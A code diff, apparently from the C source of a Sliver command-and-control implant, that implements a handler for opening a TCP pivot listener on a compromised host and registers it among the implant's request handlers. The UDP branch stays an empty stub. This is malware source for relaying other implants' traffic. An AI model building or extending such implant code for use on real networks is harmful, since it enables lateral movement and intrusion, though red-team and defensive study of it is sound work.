@@ -3428,8 +3428,8 @@ CLEANUP:
 
 PENVELOPE PivotStartListenerHandler
 (
-	_In_ PGLOBAL_CONFIG pConfig,
-	_In_ PENVELOPE pEnvelope
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpServerConn
 )
 {
 	PENVELOPE pRespEnvelope = NULL;
@@ -3440,6 +3440,9 @@ PENVELOPE PivotStartListenerHandler
 	LPSTR lpBindAddress = NULL;
 	PBOOL pOptions = NULL;
 	UINT64 uNumberOfOptions = 0;
+	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	PPIVOT_LISTENER pListener = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
 
 	for (i = 0; i < _countof(PivotStartListenerReq); i++) {
 		PivotStartListenerReq[i] = ALLOC(sizeof(PBElement));
@@ -3462,8 +3465,10 @@ PENVELOPE PivotStartListenerHandler
 		pOptions[i] = (BOOL)((PUINT64)(PivotStartListenerReq[2]))[i + 1];
 	}
 
+	pSessionClient = (PSLIVER_SESSION_CLIENT)lpServerConn;
+	pConfig = pSessionClient->pGlobalConfig;
 	if (uPivotType == PivotType_TCP) {
-
+		pListener = CreateTCPPivotListener(pConfig, pSessionClient, lpBindAddress);
 	}
 	else if (uPivotType == PivotType_UDP) {
 
@@ -3473,6 +3478,17 @@ PENVELOPE PivotStartListenerHandler
 	}
 	else {
 		goto CLEANUP;
+	}
+
+	if (pListener != NULL) {
+		if (pConfig->Listeners == NULL) {
+			pConfig->Listeners = ALLOC(sizeof(PPIVOT_LISTENER));
+		}
+		else {
+			pConfig->Listeners = REALLOC(pConfig->Listeners, sizeof(PPIVOT_LISTENER) * (pConfig->dwNumberOfListeners + 1));
+		}
+
+		pConfig->Listeners[pConfig->dwNumberOfListeners++] = pListener;
 	}
 
 CLEANUP:
@@ -3547,6 +3563,11 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgRegisterExtensionReq] = NULL;
 	HandlerList[MsgCallExtensionReq] = NULL;
 	HandlerList[MsgListExtensionsReq] = NULL;
+
+	// Pivots
+	HandlerList[MsgPivotStartListenerReq] = PivotStartListenerHandler;
+	HandlerList[MsgPivotStopListenerReq] = NULL;
+	HandlerList[MsgPivotListenersReq] = NULL;
 
 	return HandlerList;
 }
